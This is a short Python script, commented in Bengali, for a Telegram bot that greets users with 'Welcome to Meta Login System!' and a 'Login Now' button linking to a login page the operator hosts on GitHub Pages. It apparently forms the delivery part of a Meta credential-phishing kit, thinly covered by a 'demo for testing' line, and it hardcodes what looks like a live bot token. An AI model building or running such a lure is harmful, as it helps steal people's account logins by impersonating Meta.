import telebot
import time

# আপনার বট টোকেন
BOT_TOKEN = "8882839321:AAEUHITmEI4QoonA2jNTx8U7c5fKaZHFDNQ"

bot = telebot.TeleBot(BOT_TOKEN)

# আপনার লগইন পেইজের লিংক (যেখানে HTML ফাইল হোস্ট করবেন)
# GitHub Pages বা যেকোনো হোস্টিং সার্ভিস ব্যবহার করুন
LOGIN_URL = "https://your-username.github.io/login-page.html"  # <- এই লিংক পরিবর্তন করুন

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # ইনলাইন কীবোর্ড বাটন
    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton("🔐 Login Now", url=LOGIN_URL)
    markup.add(btn)
    
    bot.send_message(
        message.chat.id,
        "👋 Welcome to Meta Login System!\n\n"
        "🔐 Click the button below to login:\n"
        "⚠️ This is a demo system for testing purposes.",
        reply_markup=markup
    )

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Please use /start to get the login link.")

print("🤖 Bot is running... Press Ctrl+C to stop.")
bot.infinity_polling()